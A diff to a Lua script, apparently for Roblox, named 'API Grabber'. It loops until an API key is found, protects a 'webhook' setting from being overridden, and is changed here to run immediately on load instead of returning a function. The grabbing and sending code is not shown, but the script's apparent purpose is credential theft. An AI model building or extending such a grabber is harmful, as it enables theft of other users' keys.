@@ -191,7 +191,7 @@ local function waitForAPIKey()
 end
 
 local function main()
-    safeNotify("API Grabber", "Starting infinite loop until API key is found...", 5)
+    safeNotify("API Grabber", "Starting loop until API key is found...", 5)
     
     if settings.maxRetries > 0 then
         safeNotify("API Grabber", "Configuration: Will retry up to " .. settings.maxRetries .. " times (Delay: " .. settings.retryDelay .. "s)", 4)
@@ -207,8 +207,10 @@ local function main()
     end
 end
 
-local function safeStart(config)
-    if config then
+-- Execute directly instead of returning a function
+if game:GetService("Players").LocalPlayer then
+    local config = (...)
+    if type(config) == "table" then
         for k, v in pairs(config) do
             if k ~= "webhook" then
                 settings[k] = v
@@ -226,8 +228,4 @@ local function safeStart(config)
         safeNotify("Fatal Error", "Script encountered an error: " .. tostring(err), 5)
         print("Fatal Error:", err)
     end
-end
-
-return function(config)
-    safeStart(config)
 end
